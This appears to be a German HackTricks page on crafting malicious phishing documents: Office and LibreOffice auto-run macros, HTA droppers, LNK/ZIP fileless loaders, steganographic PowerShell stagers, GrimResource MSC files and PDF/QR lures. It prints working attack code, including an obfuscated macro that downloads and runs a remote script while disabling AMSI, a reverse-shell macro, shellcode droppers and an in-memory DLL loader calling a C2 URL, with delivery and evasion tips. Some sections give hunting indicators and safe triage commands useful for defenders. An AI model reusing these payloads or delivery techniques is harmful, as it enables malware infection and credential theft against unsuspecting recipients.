# Phishing-Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Dateidatenvalidierung durch. Die Datenvalidierung erfolgt in Form einer Identifizierung der Datenstruktur anhand des OfficeOpenXML-Standards. Tritt bei der Identifizierung der Datenstruktur ein Fehler auf, wird die analysierte Datei nicht geöffnet.

Üblicherweise verwenden Word-Dateien mit Makros die Erweiterung `.docm`. Es ist jedoch möglich, die Dateierweiterung zu ändern und die Makrofähigkeit der Datei dennoch beizubehalten.\
Eine RTF-Datei unterstützt beispielsweise von Haus aus keine Makros. Eine in RTF umbenannte DOCM-Datei wird jedoch von Microsoft Word verarbeitet und kann Makros ausführen.\
Dieselben Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint usw.).

Mit dem folgenden Befehl kannst du überprüfen, welche Erweiterungen von bestimmten Office-Programmen ausgeführt werden:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX-Dateien, die auf eine Remote-Vorlage verweisen (Datei – Optionen – Add-Ins – Verwalten: Vorlagen – Gehe zu), die Makros enthält, können ebenfalls Makros „ausführen“.

### Externes Laden von Bildern

Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
_**Kategorien**: Verknüpfungen und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://<ip>/whatever

![Office-Dokumente – Externes Laden von Bildern: Gehe zu: Einfügen -- Schnellbausteine -- Feld](<../../images/image (155).png>)

### Makro-Backdoor

Mit Makros lässt sich beliebiger Code aus dem Dokument ausführen.

#### Autoload-Funktionen

Je häufiger sie vorkommen, desto wahrscheinlicher ist es, dass das AV sie erkennt.

- AutoOpen()
- Document_Open()

#### Makro-Codebeispiele

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Metadaten manuell entfernen

Gehen Sie zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**. Dadurch wird der Dokumentinspektor geöffnet. Klicken Sie auf **Überprüfen** und dann neben **Dokumenteigenschaften und persönliche Informationen** auf **Alle entfernen**.

#### Doc-Erweiterung

Wenn Sie fertig sind, wählen Sie das Dropdown-Menü **Dateityp** und ändern Sie das Format von **`.docx`** in Word 97-2003 **`.doc`**.\
Tun Sie dies, weil Sie **keine Makros in einer `.docx` speichern können** und die Makro-fähige Erweiterung **`.docm`** einen **schlechten Ruf** hat (z. B. hat das Miniaturansicht-Symbol ein riesiges `!`, und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist die **veraltete `.doc`-Erweiterung der beste Kompromiss**.

#### Generatoren für bösartige Makros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice-ODT-Auto-Run-Makros (Basic)

LibreOffice-Writer-Dokumente können Basic-Makros einbetten und diese beim Öffnen der Datei automatisch ausführen, indem das Makro an das Ereignis **Dokument öffnen** gebunden wird (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Ein einfaches Reverse-Shell-Makro sieht so aus:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Beachte die doppelten Anführungszeichen (`""`) innerhalb des Strings – LibreOffice Basic verwendet sie, um Anführungszeichen als Literalzeichen zu maskieren. Daher bleiben bei Payloads, die mit `...==""")` enden, sowohl der innere Befehl als auch das Argument für `Shell` ausgeglichen.

Tipps zur Zustellung:

- Speichere die Datei als `.odt` und verknüpfe das Makro mit dem Dokumentereignis, damit es sofort beim Öffnen ausgeführt wird.
- Verwende beim E-Mail-Versand mit `swaks` die Option `--attach @resume.odt` (das `@` ist erforderlich, damit die Dateibytes und nicht der Dateiname als String angehängt werden). Das ist entscheidend, wenn SMTP-Server missbraucht werden, die beliebige `RCPT TO`-Empfänger ohne Validierung akzeptieren.

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es erzeugt die Benutzeroberfläche und wird als Anwendung mit „vollständigem Vertrauen“ ausgeführt, ohne den Einschränkungen des Sicherheitsmodells eines Browsers zu unterliegen.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das normalerweise zusammen mit **Internet Explorer** installiert wird. Daher ist **`mshta` von IE abhängig**. Wenn IE also deinstalliert wurde, können HTAs nicht mehr ausgeführt werden.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung „remote“ zu erzwingen**. Beispielsweise könntest du **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf das der Benutzer zugreifen wird (sogar über HTTP MitM?). Oder du sendest dem Opfer die **Adresse von Dateien**, die beim **Öffnen des Ordners** eine **Authentifizierung** **auslösen**.

**Weitere Ideen findest du auf den folgenden Seiten:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen, sondern auch **NTLM-Relay-Angriffe durchführen** kannst:

- [**NTLM Relay-Angriffe**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM Relay zu Zertifikaten)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK-Loader + ZIP-eingebettete Payloads (fileless chain)

Hocheffektive Kampagnen liefern eine ZIP-Datei mit zwei legitimen Köderdokumenten (PDF/DOCX) und einer schädlichen .lnk-Datei. Der Trick: Der eigentliche PowerShell-Loader ist nach einem eindeutigen Marker in den rohen Bytes der ZIP-Datei gespeichert, und die .lnk-Datei extrahiert und führt ihn vollständig im Speicher aus.<sup>[[2]](#references)</sup>

Typischer Ablauf des von der .lnk-Datei verwendeten PowerShell-Einzeilers:

1) Die ursprüngliche ZIP-Datei an häufigen Speicherorten suchen: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und im übergeordneten Verzeichnis des aktuellen Arbeitsverzeichnisses.
2) Die ZIP-Bytes einlesen und nach einem fest codierten Marker suchen (z. B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell-Payload.
3) Die ZIP-Datei nach %ProgramData% kopieren, dort entpacken und das Köder-.docx-Dokument öffnen, damit alles legitim wirkt.
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Die nächste Stufe deobfuskieren (z. B. alle #-Zeichen entfernen) und im Speicher ausführen.

Beispielgerüst für PowerShell, um die eingebettete Stufe zu extrahieren und auszuführen:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Notizen
- Die Auslieferung missbraucht häufig reputationsstarke PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads nur unter bestimmten Bedingungen bereitstellen (etwa harmlose ZIPs abhängig von IP/UA ausliefern).
- Die nächste Stufe entschlüsselt häufig Base64-/XOR-Shellcode und führt ihn über Reflection.Emit + VirtualAlloc aus, um Spuren auf der Festplatte zu minimieren.

Persistenz innerhalb derselben Angriffskette
- COM TypeLib Hijacking des Microsoft Web Browser Controls, sodass IE/Explorer oder jede andere App, die es einbettet, die Payload automatisch erneut startet.<sup>[[2]](#references)[[4]](#references)</sup> Details und direkt verwendbare Befehle gibt es hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die die ASCII-Markierungszeichenfolge (z. B. xFIQCV) an die Archivdaten angehängt enthalten.
- Eine .lnk-Datei, die übergeordnete und Benutzerordner durchsucht, um die ZIP-Datei zu finden, und ein Köderdokument öffnet.
- AMSI-Manipulation über [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Lang laufende geschäftliche E-Mail-Verläufe, die mit Links zu vertrauenswürdigen PaaS-Domains enden.

## LNK-Köder zuerst → Persistenz über geplante Tasks → Side-Loading einer vertrauenswürdigen CPL

Ein weiteres wiederkehrendes Muster ist eine **Dokumente vortäuschende `.lnk`-Datei**, die sofort einen harmlosen Köder öffnet, während sie im Hintergrund die eigentliche Angriffskette vorbereitet.<sup>[[3]](#references)</sup>

Beobachteter Ablauf:
1. Die Verknüpfung **tarnt sich als PDF** und verwendet `conhost.exe` oder einen ähnlichen Proxy, um einen verschleierten PowerShell-Downloader zu starten.
2. PowerShell zerlegt auffällige Tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodass einfache Erkennungen, die nach `iwr`, `gci`, `ren`, `cpi` oder `schtasks` suchen, den Befehl übersehen.
3. Der Stager lädt **zuerst das Köderdokument** herunter, öffnet es für das Opfer und stellt anschließend im Hintergrund die schädlichen Dateien wieder her.
4. Payloads können mit **Tarn-Endungen** gespeichert und dann umbenannt werden, indem Füllzeichen entfernt werden. Dadurch erscheinen offensichtliche `.exe`-/`.cpl`-Dateien erst später.
5. Die Persistenz wird über einen **minutenbasierten geplanten Task** eingerichtet, der eine vertrauenswürdige Host-Binärdatei aus einem vom Benutzer beschreibbaren Pfad startet.

Minimale Hunting-Hinweise zu diesem Muster:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Ein nützliches Staging-Layout, das man erkennen sollte:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` oder `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Warum die zweite Stufe unauffällig ist

In der Fallstudie von Rapid7 startete die geplante Aufgabe wiederholt **`Fondue.exe`** aus `C:\Users\Public\`. Da **`APPWIZ.cpl`** daneben abgelegt war und **`RunFODW`** exportierte, lud die vertrauenswürdige Microsoft-Binärdatei die Angreifer-CPL per DLL side-loading statt der legitimen Systemkopie.

Die CPL:
- Liest einen **AES-256-CBC**-Blob aus `C:\Windows\Tasks\editor.dat`
- Entschlüsselt ihn über **Windows CNG / `bcrypt.dll`**
- Allokiert ausführbaren Speicher und kopiert den entschlüsselten Shellcode hinein
- Führt ihn indirekt aus, indem sie den Shellcode-Zeiger als Callback für **`EnumUILanguagesW`** übergibt

Diesen letzten Schritt sollte man separat untersuchen: Malware vermeidet oft einen direkten Sprung wie `((void(*)())buf)()` und missbraucht stattdessen eine **legitime WinAPI-Funktion, die einen Callback entgegennimmt**, um die Ausführung zu übertragen.

Bei der entschlüsselten Payload dieser Kampagne handelte es sich um **Donut**-Shellcode. Dieser lud anschließend die finale PE vollständig in den Speicher und patchte **AMSI/WLDP/ETW** im aktuellen Prozess, bevor er die Ausführung übergab. Ausführlichere Hinweise zu Side-loading und im Speicher ausgeführten Nachbearbeitungsschritten finden Sie hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktische Ansatzpunkte für die Suche:
- `.lnk`, die `powershell.exe` oder `conhost.exe` starten, gefolgt von einem sichtbaren Täuschungsdokument.
- Kurzlebige Downloads nach **`C:\Users\Public\`**, gefolgt von sofortigen Umbenennungen mit unsinnigen Erweiterungen.
- Geplante Aufgaben mit unauffälligen Namen wie `GoogleErrorReport`, die aus **benutzerschreibbaren Verzeichnissen** ausgeführt werden.
- Vertrauenswürdige Binärdateien, die **`.cpl`- / `.dll`-Dateien** aus demselben Nicht-Systemverzeichnis laden.
- Base64-Textblobs, die unter **`C:\Windows\Tasks\`** geschrieben und anschließend vom per Side-loading geladenen Modul gelesen werden.

## Mit Steganografie abgegrenzte Payloads in Bildern (PowerShell-Stager)

Aktuelle Loader-Ketten liefern ein verschleiertes JavaScript/VBS aus, das einen Base64-PowerShell-Stager dekodiert und ausführt. Dieser Stager lädt ein Bild (oft ein GIF) herunter, das eine Base64-codierte .NET-DLL als Klartext zwischen eindeutigen Start-/Endmarkierungen verbirgt. Das Skript sucht nach diesen Begrenzungen (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den Text dazwischen, dekodiert ihn per Base64 in Bytes, lädt die Assembly in den Speicher und ruft eine bekannte Einstiegsmethode mit der C2-URL auf.<sup>[[5]](#references)</sup>

Ablauf
- Stufe 1: Archivierter JS/VBS-Dropper → dekodiert eingebettetes Base64 → startet den PowerShell-Stager mit -nop -w hidden -ep bypass.
- Stufe 2: PowerShell-Stager → lädt ein Bild herunter, extrahiert das durch Markierungen begrenzte Base64, lädt die .NET-DLL in den Speicher und ruft ihre Methode auf (z. B. VAI) – mit der C2-URL und Optionen als Argumenten.
- Stufe 3: Der Loader ruft die finale Payload ab und injiziert sie üblicherweise per Process Hollowing in eine vertrauenswürdige Binärdatei (häufig MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Weitere Informationen zu Process Hollowing und der Proxy-Ausführung über vertrauenswürdige Hilfsprogramme finden Sie hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel zum Extrahieren einer DLL aus einem Bild und Aufrufen einer .NET-Methode im Speicher:

<details>
<summary>PowerShell-Extraktor und -Loader für Stego-Payloads</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Hinweise
- Dies ist ATT&CK T1027.003 (Steganografie/Marker-Versteckung).<sup>[[6]](#references)</sup> Marker unterscheiden sich je nach Kampagne.
- AMSI/ETW-Bypass und String-Deobfuskation werden häufig vor dem Laden der Assembly angewendet.
- Hunting: heruntergeladene Bilder nach bekannten Trennzeichen durchsuchen; PowerShell-Prozesse identifizieren, die auf Bilder zugreifen und unmittelbar Base64-Blobs decodieren.

Siehe auch stego tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS-Droppers → Base64-PowerShell-Staging

Eine wiederkehrende erste Stufe ist eine kleine, stark obfuskierte `.js`- oder `.vbs`-Datei, die in einem Archiv bereitgestellt wird. Ihr einziger Zweck besteht darin, einen eingebetteten Base64-String zu decodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS zu laden.<sup>[[5]](#references)</sup>

Grundlegende Logik (abstrakt):
- Eigenen Dateiinhalt einlesen
- Einen Base64-Blob zwischen Junk-Strings finden
- In ASCII-PowerShell decodieren
- Mit `wscript.exe`/`cscript.exe` `powershell.exe` aufrufen und ausführen

Hunting-Indikatoren
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Befehlszeile starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus temporären Benutzerverzeichnissen startet.

## MSC-Dokumente als Ausführungscontainer (GrimResource)

Microsoft Management Console-Dateien (`.msc`) sind XML-Konsolendefinitionen, die normalerweise mit `mmc.exe` geöffnet werden. **GrimResource** missbraucht eine `StringTable`-Referenz auf eine `apds.dll`-Ressource, die ein altes XSS-Primitiv enthält. Dadurch wird JavaScript innerhalb von `mmc.exe` ausgeführt, wenn ein Benutzer die manipulierte Konsole öffnet. Beobachtete Samples kombinierten Obfuskation auf Basis von `transformNode` mit **DotNetToJScript**, um eine .NET-Payload ohne den üblichen Office-Makro-Weg zu instanziieren.<sup>[[9]](#references)</sup>

Behandle ein nicht vertrauenswürdiges MSC zur statischen Triage als Text und klicke **nicht** doppelt darauf:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Signifikante Runtime-Pivots sind, wenn `mmc.exe` die CLR- oder Script-Komponenten lädt, Netzwerkverbindungen herstellt oder `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` oder eine unerwartete ausführbare Datei startet. Das Format ist legitim. Erkennungsregeln sollten daher **Herkunft + verdächtige XML-/Script-Inhalte + Verhalten von `mmc.exe`** miteinander verknüpfen, statt alle MSC-Dateien zu blockieren.<sup>[[9]](#references)</sup>

## PDF-/QR-Weiterleitungen und Payload-Steuerung

Ein PDF muss keinen Exploit enthalten, um nützlich zu sein. In jüngsten Kampagnen platzieren Angreifer einen **QR-Code oder einen gewöhnlichen Link** in einem harmlos wirkenden Dokument, leiten die Browser-Sitzung an den E-Mail-Sicherheitskontrollen vorbei und personalisieren das Ziel mit der Empfängeradresse. Microsoft dokumentierte 2025 PDFs, deren QR-URLs für jeden Empfänger einzigartig waren und zu einer RaccoonO365-Infrastruktur zum Abgreifen von Zugangsdaten führten. Eine parallele Angriffskette nutzte IP-/Umgebungsprüfungen, um ausgewählten Besuchern einen JavaScript-/MSI-Pfad, Scannern oder nicht zugelassenen Clients hingegen ein harmloses PDF zurückzugeben.<sup>[[10]](#references)</sup>

Prüfen Sie sowohl PDF-Aktionen als auch gerenderte QR-Codes. Ein QR-Code kann als Vektorgrafik gezeichnet sein, statt als extrahierbares Bild vorzuliegen. Rastern Sie daher jede Seite und extrahieren Sie zusätzlich die eingebetteten Bilder:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Untersuche decodierte Ziele und Weiterleitungen von einem isolierten Analysesystem aus, ohne dich zu authentifizieren. Nützliche Merkmale für die Suche sind PDFs, die nur QR-Codes enthalten, bei nahezu leeren E-Mail-Texten, die E-Mail-Adresse des Empfängers in einem Query-Parameter, mehrere Weiterleitungen über seriöse Hosting-Anbieter und unterschiedliche Inhalte, abhängig von IP-Adresse, Geolocation, Cookies, Referrer oder User-Agent. Vergleiche Anfragen mit kontrollierten Profilen, da ein einzelner Sandbox-Abruf möglicherweise nur die Täuschungsseite erhält.<sup>[[10]](#references)</sup>

## Windows-Dateien zum Stehlen von NTLM-Hashes

Sieh dir die Seite über **Orte zum Stehlen von NTLM-Anmeldedaten** an:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice-Makro → IIS-Webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine-Kampagne: Ein ausgeklügelter Phishing-Angriff auf US-Unternehmen](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Die Vorgehensweise von Dropping Elephant anhand einer China-Themen-Loader-Kette verfolgen](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Neue COM-Persistenztechnik (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader liefert eine Reihe von Infostealern aus](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Ausführung über Proxy vertrauenswürdiger Entwickler-Tools: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console für Initial Access und Umgehung](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Bedrohungsakteure nutzen die Steuersaison, um Phishing-Kampagnen mit Steuerthematik zu starten](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
